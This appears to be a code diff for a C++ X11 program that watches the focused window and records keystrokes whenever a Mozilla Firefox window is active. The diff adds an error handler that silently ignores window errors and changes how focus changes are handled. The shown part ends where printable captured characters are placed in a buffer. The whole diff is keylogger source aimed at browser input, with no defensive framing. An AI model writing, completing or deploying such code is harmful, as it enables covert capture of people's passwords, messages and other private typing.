@@ -5,11 +5,13 @@
 #include <unistd.h>
 #include <X11/Xatom.h>
 #include <string.h>
+#include <stdio.h>
 using namespace std;
 
 
-string WINDOWS_FIREFOX = "Mozilla Firefox";
+string WINDOW_FIREFOX = "Mozilla Firefox";
 
+//Get name of a window.
 char *name (Display *disp, Window win) {
     Atom prop = XInternAtom(disp,"WM_NAME",False), type;
     int form;
@@ -17,11 +19,14 @@ char *name (Display *disp, Window win) {
     unsigned char *list;
     if (XGetWindowProperty(disp,win,prop,0,1024,False,AnyPropertyType,
                 &type,&form,&len,&remain,&list) != Success) {
-        return strdup("Root");
+        return NULL;
     }
     return (char*)list;
 }
-
+int handler(Display* d, XErrorEvent* e){
+	//Skip the stupid window error if the workaround not working :D
+	return 0;
+}
 int main(int argc, char* argv[]){
     Display *disp = XOpenDisplay(NULL);
     Window activeWindow = -1;
@@ -35,8 +40,8 @@ int main(int argc, char* argv[]){
     Window root = DefaultRootWindow(disp);
     XGetInputFocus (disp, &activeWindow, &revert);
     XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);
+    XSetErrorHandler(handler);
     active = name(disp, activeWindow);
-	if (active != NULL) cout << string(active);
     while (1) {
         XEvent ev;
         XNextEvent(disp, &ev);
@@ -44,7 +49,10 @@ int main(int argc, char* argv[]){
             case FocusOut: 
             {
                 XGetInputFocus (disp, &activeWindow, &revert);
-				if (activeWindow == 1) break;
+				if (activeWindow == 1) break; //BadWindow error workaround :v
+				if (activeWindow == PointerRoot) {
+                    activeWindow = root;
+                }   
                 if (name(disp,activeWindow) != NULL){
 					if (active == NULL){
 						active = name(disp,activeWindow);
@@ -59,10 +67,7 @@ int main(int argc, char* argv[]){
 						}
 					}
                 }
-                if (activeWindow == PointerRoot) {
-                    activeWindow = root;
-                }       
-				XGetInputFocus (disp, &activeWindow, &revert);        
+                            
                 XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);	 
                 break;
             }
@@ -71,7 +76,7 @@ int main(int argc, char* argv[]){
             {
                 if (active != NULL){
                     activeName = string(active);
-                    if (activeName.find(WINDOWS_FIREFOX) != std::string::npos){
+                    if (activeName.find(WINDOW_FIREFOX) != std::string::npos){
                         len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
                         if (len > 0 && isprint(buf[0])) {
                             buf[len]=0;
